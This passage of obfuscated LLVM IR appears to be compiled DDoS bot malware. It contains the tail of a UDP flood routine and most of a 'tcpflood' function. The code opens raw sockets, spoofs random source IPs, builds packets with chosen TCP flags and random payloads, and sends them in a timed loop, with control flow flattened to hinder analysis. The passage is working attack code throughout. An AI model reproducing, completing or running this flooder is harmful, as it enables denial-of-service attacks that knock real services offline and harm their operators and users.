  %159 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %160 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 2
  %161 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %160, i32 0, i32 0
  %162 = load i32, i32* %161, align 4
  %163 = load i32, i32* %20, align 4
  %164 = call i32 @getRandomIP(i32 %163)
  %165 = call i32 @htonl(i32 %164) #9
  %166 = load i32, i32* %8, align 4
  %167 = sext i32 %166 to i64
  %168 = add i64 8, %167
  %169 = trunc i64 %168 to i32
  call void @makeIPPacket(%struct.iphdr* %159, i32 %162, i32 %165, i8 zeroext 17, i32 %169)
  %170 = load i32, i32* %8, align 4
  %171 = sext i32 %170 to i64
  %172 = add i64 8, %171
  %173 = trunc i64 %172 to i16
  %174 = call zeroext i16 @htons(i16 zeroext %173) #9
  %175 = load %struct.udphdr*, %struct.udphdr** %23, align 8
  %176 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %175, i32 0, i32 2
  store i16 %174, i16* %176, align 2
  %177 = call i32 @rand_cmwc()
  %178 = trunc i32 %177 to i16
  %179 = load %struct.udphdr*, %struct.udphdr** %23, align 8
  %180 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %179, i32 0, i32 0
  store i16 %178, i16* %180, align 2
  %181 = load i32, i32* %6, align 4
  %182 = icmp eq i32 %181, 0
  %183 = select i1 %182, i32 1579307389, i32 601278762
  store i32 %183, i32* %switchVar
  br label %loopEnd

; <label>:184:                                    ; preds = %loopEntry
  %185 = call i32 @rand_cmwc()
  store i32 -309533586, i32* %switchVar
  store i32 %185, i32* %.reg2mem10
  br label %loopEnd

; <label>:186:                                    ; preds = %loopEntry
  %187 = load i32, i32* %6, align 4
  %188 = trunc i32 %187 to i16
  %189 = call zeroext i16 @htons(i16 zeroext %188) #9
  %190 = zext i16 %189 to i32
  store i32 -309533586, i32* %switchVar
  store i32 %190, i32* %.reg2mem10
  br label %loopEnd

; <label>:191:                                    ; preds = %loopEntry
  %.reload11 = load i32, i32* %.reg2mem10
  %192 = trunc i32 %.reload11 to i16
  %193 = load %struct.udphdr*, %struct.udphdr** %23, align 8
  %194 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %193, i32 0, i32 1
  store i16 %192, i16* %194, align 2
  %195 = load %struct.udphdr*, %struct.udphdr** %23, align 8
  %196 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %195, i32 0, i32 3
  store i16 0, i16* %196, align 2
  %197 = load %struct.udphdr*, %struct.udphdr** %23, align 8
  %198 = bitcast %struct.udphdr* %197 to i8*
  %199 = getelementptr inbounds i8, i8* %198, i64 8
  %200 = load i32, i32* %8, align 4
  call void @makeRandomStr(i8* %199, i32 %200)
  %.reload8 = load volatile i8*, i8** %.reg2mem5
  %201 = bitcast i8* %.reload8 to i16*
  %202 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %203 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %202, i32 0, i32 2
  %204 = load i16, i16* %203, align 2
  %205 = zext i16 %204 to i32
  %206 = call zeroext i16 @csum(i16* %201, i32 %205)
  %207 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %208 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %207, i32 0, i32 7
  store i16 %206, i16* %208, align 2
  %209 = call i64 @time(i64* null) #6
  %210 = load i32, i32* %7, align 4
  %211 = sext i32 %210 to i64
  %212 = add nsw i64 %209, %211
  %213 = trunc i64 %212 to i32
  store i32 %213, i32* %24, align 4
  store i32 0, i32* %25, align 4
  store i32 2108783135, i32* %switchVar
  br label %loopEnd

; <label>:214:                                    ; preds = %loopEntry
  store i32 1135360337, i32* %switchVar
  br label %loopEnd

; <label>:215:                                    ; preds = %loopEntry
  %216 = load i32, i32* %17, align 4
  %217 = bitcast %struct.sockaddr_in* %11 to %struct.sockaddr*
  %.reload3 = load volatile i64, i64* %.reg2mem2
  %.reload7 = load volatile i8*, i8** %.reg2mem5
  %218 = call i64 @sendto(i32 %216, i8* %.reload7, i64 %.reload3, i32 0, %struct.sockaddr* %217, i32 16)
  %219 = call i32 @rand_cmwc()
  %220 = trunc i32 %219 to i16
  %221 = load %struct.udphdr*, %struct.udphdr** %23, align 8
  %222 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %221, i32 0, i32 0
  store i16 %220, i16* %222, align 2
  %223 = load i32, i32* %6, align 4
  %224 = icmp eq i32 %223, 0
  %225 = select i1 %224, i32 150302567, i32 395240676
  store i32 %225, i32* %switchVar
  br label %loopEnd

; <label>:226:                                    ; preds = %loopEntry
  %227 = call i32 @rand_cmwc()
  store i32 -256545243, i32* %switchVar
  store i32 %227, i32* %.reg2mem12
  br label %loopEnd

; <label>:228:                                    ; preds = %loopEntry
  %229 = load i32, i32* %6, align 4
  %230 = trunc i32 %229 to i16
  %231 = call zeroext i16 @htons(i16 zeroext %230) #9
  %232 = zext i16 %231 to i32
  store i32 -256545243, i32* %switchVar
  store i32 %232, i32* %.reg2mem12
  br label %loopEnd

; <label>:233:                                    ; preds = %loopEntry
  %.reload13 = load i32, i32* %.reg2mem12
  %234 = trunc i32 %.reload13 to i16
  %235 = load %struct.udphdr*, %struct.udphdr** %23, align 8
  %236 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %235, i32 0, i32 1
  store i16 %234, i16* %236, align 2
  %237 = call i32 @rand_cmwc()
  %238 = trunc i32 %237 to i16
  %239 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %240 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %239, i32 0, i32 3
  store i16 %238, i16* %240, align 4
  %241 = load i32, i32* %20, align 4
  %242 = call i32 @getRandomIP(i32 %241)
  %243 = call i32 @htonl(i32 %242) #9
  %244 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %245 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %244, i32 0, i32 8
  store i32 %243, i32* %245, align 4
  %.reload6 = load volatile i8*, i8** %.reg2mem5
  %246 = bitcast i8* %.reload6 to i16*
  %247 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %248 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %247, i32 0, i32 2
  %249 = load i16, i16* %248, align 2
  %250 = zext i16 %249 to i32
  %251 = call zeroext i16 @csum(i16* %246, i32 %250)
  %252 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %253 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %252, i32 0, i32 7
  store i16 %251, i16* %253, align 2
  %254 = load i32, i32* %25, align 4
  %255 = load i32, i32* %12, align 4
  %256 = icmp eq i32 %254, %255
  %257 = select i1 %256, i32 -1182071284, i32 -1097687936
  store i32 %257, i32* %switchVar
  br label %loopEnd

; <label>:258:                                    ; preds = %loopEntry
  %259 = call i64 @time(i64* null) #6
  %260 = load i32, i32* %24, align 4
  %261 = sext i32 %260 to i64
  %262 = icmp sgt i64 %259, %261
  %263 = select i1 %262, i32 1080765494, i32 -1333278520
  store i32 %263, i32* %switchVar
  br label %loopEnd

; <label>:264:                                    ; preds = %loopEntry
  store i32 1330746140, i32* %switchVar
  br label %loopEnd

; <label>:265:                                    ; preds = %loopEntry
  store i32 0, i32* %25, align 4
  store i32 2108783135, i32* %switchVar
  br label %loopEnd

; <label>:266:                                    ; preds = %loopEntry
  %267 = load i32, i32* %25, align 4
  %268 = add i32 %267, 1
  store i32 %268, i32* %25, align 4
  store i32 2108783135, i32* %switchVar
  br label %loopEnd

; <label>:269:                                    ; preds = %loopEntry
  %270 = load i8*, i8** %21, align 8
  call void @llvm.stackrestore(i8* %270)
  store i32 40870114, i32* %switchVar
  br label %loopEnd

; <label>:271:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %269, %266, %265, %264, %258, %233, %228, %226, %215, %214, %191, %186, %184, %148, %142, %141, %137, %130, %125, %124, %123, %117, %116, %111, %110, %107, %106, %105, %99, %95, %91, %80, %68, %67, %59, %58, %53, %46, %45, %39, %34, %30, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #1

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #2

; Function Attrs: nounwind
declare i64 @time(i64*) #2

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #5

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #2

; Function Attrs: nounwind
declare void @srand(i32) #2

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #6

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #1

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #6

; Function Attrs: noinline nounwind uwtable
define void @tcpflood(i8*, i32, i32, i32, i8*) #0 {
  %.reg2mem5 = alloca i8*
  %.reg2mem2 = alloca i64
  %.reg2mem = alloca i32
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca %struct.sockaddr_in, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i8*, align 8
  %19 = alloca %struct.iphdr*, align 8
  %20 = alloca %struct.tcphdr*, align 8
  %21 = alloca i8*, align 8
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  store i8* %0, i8** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  store i8* %4, i8** %10, align 8
  store i32 32, i32* %11, align 4
  store i32 10, i32* %12, align 4
  %24 = load i32, i32* %12, align 4
  store i32 %24, i32* %13, align 4
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 0
  store i16 2, i16* %25, align 4
  %26 = load i32, i32* %7, align 4
  store i32 %26, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1516617945, i32* %switchVar
  %.reg2mem10 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %5
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1516617945, label %first
    i32 -984087542, label %29
    i32 -1588363349, label %33
    i32 -1095589484, label %38
    i32 463428841, label %44
    i32 -1324294898, label %45
    i32 -1536842806, label %52
    i32 -26329202, label %53
    i32 1923925774, label %59
    i32 1134420146, label %60
    i32 1479361542, label %64
    i32 2080239393, label %65
    i32 391253828, label %71
    i32 350799486, label %119
    i32 682025047, label %155
    i32 -1764993953, label %158
    i32 1724032551, label %162
    i32 940493301, label %167
    i32 918294462, label %175
    i32 -2128755015, label %180
    i32 1351266362, label %188
    i32 1741424738, label %193
    i32 -1385265704, label %201
    i32 1608986280, label %206
    i32 372286800, label %214
    i32 -1723018517, label %219
    i32 -249350172, label %227
    i32 -1590820263, label %230
    i32 169598053, label %231
    i32 490062102, label %232
    i32 833457609, label %233
    i32 829222177, label %234
    i32 -1490339062, label %236
    i32 -227913356, label %237
    i32 1283272274, label %255
    i32 932442506, label %257
    i32 -1734803076, label %262
    i32 -625292857, label %288
    i32 -942321843, label %289
    i32 -981476614, label %336
    i32 507676968, label %342
    i32 -2104998856, label %343
    i32 1342613672, label %344
    i32 -742437515, label %347
    i32 -378490972, label %349
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %27 = icmp eq i32 %.reload, 0
  %28 = select i1 %27, i32 -984087542, i32 -1588363349
  store i32 %28, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = call i32 @rand_cmwc()
  %31 = trunc i32 %30 to i16
  %32 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 1
  store i16 %31, i16* %32, align 2
  store i32 -1095589484, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load i32, i32* %7, align 4
  %35 = trunc i32 %34 to i16
  %36 = call zeroext i16 @htons(i16 zeroext %35) #9
  %37 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 1
  store i16 %36, i16* %37, align 2
  store i32 -1095589484, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = load i8*, i8** %6, align 8
  %40 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 2
  %41 = call i32 @getHost(i8* %39, %struct.in_addr* %40)
  %42 = icmp ne i32 %41, 0
  %43 = select i1 %42, i32 463428841, i32 -1324294898
  store i32 %43, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  store i32 -378490972, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 3
  %47 = getelementptr inbounds [8 x i8], [8 x i8]* %46, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 8, i32 4, i1 false)
  %48 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %48, i32* %15, align 4
  %49 = load i32, i32* %15, align 4
  %50 = icmp ne i32 %49, 0
  %51 = select i1 %50, i32 -26329202, i32 -1536842806
  store i32 %51, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  store i32 -378490972, i32* %switchVar
  br label %loopEnd

; <label>:53:                                     ; preds = %loopEntry
  store i32 1, i32* %16, align 4
  %54 = load i32, i32* %15, align 4
  %55 = bitcast i32* %16 to i8*
  %56 = call i32 @setsockopt(i32 %54, i32 0, i32 3, i8* %55, i32 4) #6
  %57 = icmp slt i32 %56, 0
  %58 = select i1 %57, i32 1923925774, i32 1134420146
  store i32 %58, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  store i32 -378490972, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  %61 = load i32, i32* %11, align 4
  %62 = icmp eq i32 %61, 0
  %63 = select i1 %62, i32 1479361542, i32 2080239393
  store i32 %63, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  store i32 0, i32* %17, align 4
  store i32 391253828, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = load i32, i32* %11, align 4
  %67 = sub nsw i32 32, %66
  %68 = shl i32 1, %67
  %69 = sub nsw i32 %68, 1
  %70 = xor i32 %69, -1
  store i32 %70, i32* %17, align 4
  store i32 391253828, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i32, i32* %9, align 4
  %73 = sext i32 %72 to i64
  %74 = add i64 40, %73
  store i64 %74, i64* %.reg2mem2
  %75 = call i8* @llvm.stacksave()
  store i8* %75, i8** %18, align 8
  %.reload4 = load volatile i64, i64* %.reg2mem2
  %76 = alloca i8, i64 %.reload4, align 16
  store i8* %76, i8** %.reg2mem5
  %.reload9 = load volatile i8*, i8** %.reg2mem5
  %77 = bitcast i8* %.reload9 to %struct.iphdr*
  store %struct.iphdr* %77, %struct.iphdr** %19, align 8
  %78 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %79 = bitcast %struct.iphdr* %78 to i8*
  %80 = getelementptr i8, i8* %79, i64 20
  %81 = bitcast i8* %80 to %struct.tcphdr*
  store %struct.tcphdr* %81, %struct.tcphdr** %20, align 8
  %82 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %83 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 2
  %84 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %83, i32 0, i32 0
  %85 = load i32, i32* %84, align 4
  %86 = load i32, i32* %17, align 4
  %87 = call i32 @getRandomIP(i32 %86)
  %88 = call i32 @htonl(i32 %87) #9
  %89 = load i32, i32* %9, align 4
  %90 = sext i32 %89 to i64
  %91 = add i64 20, %90
  %92 = trunc i64 %91 to i32
  call void @makeIPPacket(%struct.iphdr* %82, i32 %85, i32 %88, i8 zeroext 6, i32 %92)
  %93 = call i32 @rand_cmwc()
  %94 = trunc i32 %93 to i16
  %95 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %96 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %95, i32 0, i32 0
  %97 = bitcast %union.anon* %96 to %struct.anon.0*
  %98 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %97, i32 0, i32 0
  store i16 %94, i16* %98, align 4
  %99 = call i32 @rand_cmwc()
  %100 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %101 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %100, i32 0, i32 0
  %102 = bitcast %union.anon* %101 to %struct.anon.0*
  %103 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %102, i32 0, i32 2
  store i32 %99, i32* %103, align 4
  %104 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %105 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %104, i32 0, i32 0
  %106 = bitcast %union.anon* %105 to %struct.anon.0*
  %107 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %106, i32 0, i32 3
  store i32 0, i32* %107, align 4
  %108 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %109 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %108, i32 0, i32 0
  %110 = bitcast %union.anon* %109 to %struct.anon.0*
  %111 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %110, i32 0, i32 4
  %112 = load i16, i16* %111, align 4
  %113 = and i16 %112, -241
  %114 = or i16 %113, 80
  store i16 %114, i16* %111, align 4
  %115 = load i8*, i8** %10, align 8
  %116 = call i32 @strcmp(i8* %115, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.42, i32 0, i32 0)) #10
  %117 = icmp ne i32 %116, 0
  %118 = select i1 %117, i32 682025047, i32 350799486
  store i32 %118, i32* %switchVar
  br label %loopEnd

; <label>:119:                                    ; preds = %loopEntry
  %120 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %121 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %120, i32 0, i32 0
  %122 = bitcast %union.anon* %121 to %struct.anon.0*
  %123 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %122, i32 0, i32 4
  %124 = load i16, i16* %123, align 4
  %125 = and i16 %124, -513
  %126 = or i16 %125, 512
  store i16 %126, i16* %123, align 4
  %127 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %128 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %127, i32 0, i32 0
  %129 = bitcast %union.anon* %128 to %struct.anon.0*
  %130 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %129, i32 0, i32 4
  %131 = load i16, i16* %130, align 4
  %132 = and i16 %131, -1025
  %133 = or i16 %132, 1024
  store i16 %133, i16* %130, align 4
  %134 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %135 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %134, i32 0, i32 0
  %136 = bitcast %union.anon* %135 to %struct.anon.0*
  %137 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %136, i32 0, i32 4
  %138 = load i16, i16* %137, align 4
  %139 = and i16 %138, -257
  %140 = or i16 %139, 256
  store i16 %140, i16* %137, align 4
  %141 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %142 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %141, i32 0, i32 0
  %143 = bitcast %union.anon* %142 to %struct.anon.0*
  %144 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %143, i32 0, i32 4
  %145 = load i16, i16* %144, align 4
  %146 = and i16 %145, -4097
  %147 = or i16 %146, 4096
  store i16 %147, i16* %144, align 4
  %148 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %149 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %148, i32 0, i32 0
  %150 = bitcast %union.anon* %149 to %struct.anon.0*
  %151 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %150, i32 0, i32 4
  %152 = load i16, i16* %151, align 4
  %153 = and i16 %152, -2049
  %154 = or i16 %153, 2048
  store i16 %154, i16* %151, align 4
  store i32 -227913356, i32* %switchVar
  br label %loopEnd

; <label>:155:                                    ; preds = %loopEntry
  %156 = load i8*, i8** %10, align 8
  %157 = call i8* @strtok(i8* %156, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #6
  store i8* %157, i8** %21, align 8
  store i32 -1764993953, i32* %switchVar
  br label %loopEnd

; <label>:158:                                    ; preds = %loopEntry
  %159 = load i8*, i8** %21, align 8
  %160 = icmp ne i8* %159, null
  %161 = select i1 %160, i32 1724032551, i32 -1490339062
  store i32 %161, i32* %switchVar
  br label %loopEnd

; <label>:162:                                    ; preds = %loopEntry
  %163 = load i8*, i8** %21, align 8
  %164 = call i32 @strcmp(i8* %163, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.44, i32 0, i32 0)) #10
  %165 = icmp ne i32 %164, 0
  %166 = select i1 %165, i32 918294462, i32 940493301
  store i32 %166, i32* %switchVar
  br label %loopEnd

; <label>:167:                                    ; preds = %loopEntry
  %168 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %169 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %168, i32 0, i32 0
  %170 = bitcast %union.anon* %169 to %struct.anon.0*
  %171 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %170, i32 0, i32 4
  %172 = load i16, i16* %171, align 4
  %173 = and i16 %172, -513
  %174 = or i16 %173, 512
  store i16 %174, i16* %171, align 4
  store i32 829222177, i32* %switchVar
  br label %loopEnd

; <label>:175:                                    ; preds = %loopEntry
  %176 = load i8*, i8** %21, align 8
  %177 = call i32 @strcmp(i8* %176, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.45, i32 0, i32 0)) #10
  %178 = icmp ne i32 %177, 0
  %179 = select i1 %178, i32 1351266362, i32 -2128755015
  store i32 %179, i32* %switchVar
  br label %loopEnd

; <label>:180:                                    ; preds = %loopEntry
  %181 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %182 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %181, i32 0, i32 0
  %183 = bitcast %union.anon* %182 to %struct.anon.0*
  %184 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %183, i32 0, i32 4
  %185 = load i16, i16* %184, align 4
  %186 = and i16 %185, -1025
  %187 = or i16 %186, 1024
  store i16 %187, i16* %184, align 4
  store i32 833457609, i32* %switchVar
  br label %loopEnd

; <label>:188:                                    ; preds = %loopEntry
  %189 = load i8*, i8** %21, align 8
  %190 = call i32 @strcmp(i8* %189, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.46, i32 0, i32 0)) #10
  %191 = icmp ne i32 %190, 0
  %192 = select i1 %191, i32 -1385265704, i32 1741424738
  store i32 %192, i32* %switchVar
  br label %loopEnd

; <label>:193:                                    ; preds = %loopEntry
  %194 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %195 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %194, i32 0, i32 0
  %196 = bitcast %union.anon* %195 to %struct.anon.0*
  %197 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %196, i32 0, i32 4
  %198 = load i16, i16* %197, align 4
  %199 = and i16 %198, -257
  %200 = or i16 %199, 256
  store i16 %200, i16* %197, align 4
  store i32 490062102, i32* %switchVar
  br label %loopEnd

; <label>:201:                                    ; preds = %loopEntry
  %202 = load i8*, i8** %21, align 8
  %203 = call i32 @strcmp(i8* %202, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.47, i32 0, i32 0)) #10
  %204 = icmp ne i32 %203, 0
  %205 = select i1 %204, i32 372286800, i32 1608986280
  store i32 %205, i32* %switchVar
  br label %loopEnd

; <label>:206:                                    ; preds = %loopEntry
  %207 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %208 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %207, i32 0, i32 0
  %209 = bitcast %union.anon* %208 to %struct.anon.0*
  %210 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %209, i32 0, i32 4
  %211 = load i16, i16* %210, align 4
  %212 = and i16 %211, -4097
  %213 = or i16 %212, 4096
  store i16 %213, i16* %210, align 4
  store i32 169598053, i32* %switchVar
  br label %loopEnd

; <label>:214:                                    ; preds = %loopEntry
  %215 = load i8*, i8** %21, align 8
  %216 = call i32 @strcmp(i8* %215, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.48, i32 0, i32 0)) #10
  %217 = icmp ne i32 %216, 0
  %218 = select i1 %217, i32 -249350172, i32 -1723018517
  store i32 %218, i32* %switchVar
  br label %loopEnd

; <label>:219:                                    ; preds = %loopEntry
  %220 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %221 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %220, i32 0, i32 0
  %222 = bitcast %union.anon* %221 to %struct.anon.0*
  %223 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %222, i32 0, i32 4
  %224 = load i16, i16* %223, align 4
  %225 = and i16 %224, -2049
  %226 = or i16 %225, 2048
  store i16 %226, i16* %223, align 4
  store i32 -1590820263, i32* %switchVar
  br label %loopEnd

; <label>:227:                                    ; preds = %loopEntry
  %228 = load i8*, i8** %21, align 8
  %229 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.49, i32 0, i32 0), i8* %228)
  store i32 -1590820263, i32* %switchVar
  br label %loopEnd

; <label>:230:                                    ; preds = %loopEntry
  store i32 169598053, i32* %switchVar
  br label %loopEnd

; <label>:231:                                    ; preds = %loopEntry
  store i32 490062102, i32* %switchVar
  br label %loopEnd

; <label>:232:                                    ; preds = %loopEntry
  store i32 833457609, i32* %switchVar
  br label %loopEnd

; <label>:233:                                    ; preds = %loopEntry
  store i32 829222177, i32* %switchVar
  br label %loopEnd

; <label>:234:                                    ; preds = %loopEntry
  %235 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #6
  store i8* %235, i8** %21, align 8
  store i32 -1764993953, i32* %switchVar
  br label %loopEnd

; <label>:236:                                    ; preds = %loopEntry
  store i32 -227913356, i32* %switchVar
  br label %loopEnd

; <label>:237:                                    ; preds = %loopEntry
  %238 = call i32 @rand_cmwc()
  %239 = trunc i32 %238 to i16
  %240 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %241 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %240, i32 0, i32 0
  %242 = bitcast %union.anon* %241 to %struct.anon.0*
  %243 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %242, i32 0, i32 5
  store i16 %239, i16* %243, align 2
  %244 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %245 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %244, i32 0, i32 0
  %246 = bitcast %union.anon* %245 to %struct.anon.0*
  %247 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %246, i32 0, i32 6
  store i16 0, i16* %247, align 4
  %248 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %249 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %248, i32 0, i32 0
  %250 = bitcast %union.anon* %249 to %struct.anon.0*
  %251 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %250, i32 0, i32 7
  store i16 0, i16* %251, align 2
  %252 = load i32, i32* %7, align 4
  %253 = icmp eq i32 %252, 0
  %254 = select i1 %253, i32 1283272274, i32 932442506
  store i32 %254, i32* %switchVar
  br label %loopEnd

; <label>:255:                                    ; preds = %loopEntry
  %256 = call i32 @rand_cmwc()
  store i32 -1734803076, i32* %switchVar
  store i32 %256, i32* %.reg2mem10
  br label %loopEnd

; <label>:257:                                    ; preds = %loopEntry
  %258 = load i32, i32* %7, align 4
  %259 = trunc i32 %258 to i16
  %260 = call zeroext i16 @htons(i16 zeroext %259) #9
  %261 = zext i16 %260 to i32
  store i32 -1734803076, i32* %switchVar
  store i32 %261, i32* %.reg2mem10
  br label %loopEnd

; <label>:262:                                    ; preds = %loopEntry
  %.reload11 = load i32, i32* %.reg2mem10
  %263 = trunc i32 %.reload11 to i16
  %264 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %265 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %264, i32 0, i32 0
  %266 = bitcast %union.anon* %265 to %struct.anon.0*
  %267 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %266, i32 0, i32 1
  store i16 %263, i16* %267, align 2
  %268 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %269 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %270 = call zeroext i16 @tcpcsum(%struct.iphdr* %268, %struct.tcphdr* %269)
  %271 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %272 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %271, i32 0, i32 0
  %273 = bitcast %union.anon* %272 to %struct.anon.0*
  %274 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %273, i32 0, i32 6
  store i16 %270, i16* %274, align 4
  %.reload8 = load volatile i8*, i8** %.reg2mem5
  %275 = bitcast i8* %.reload8 to i16*
  %276 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %277 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %276, i32 0, i32 2
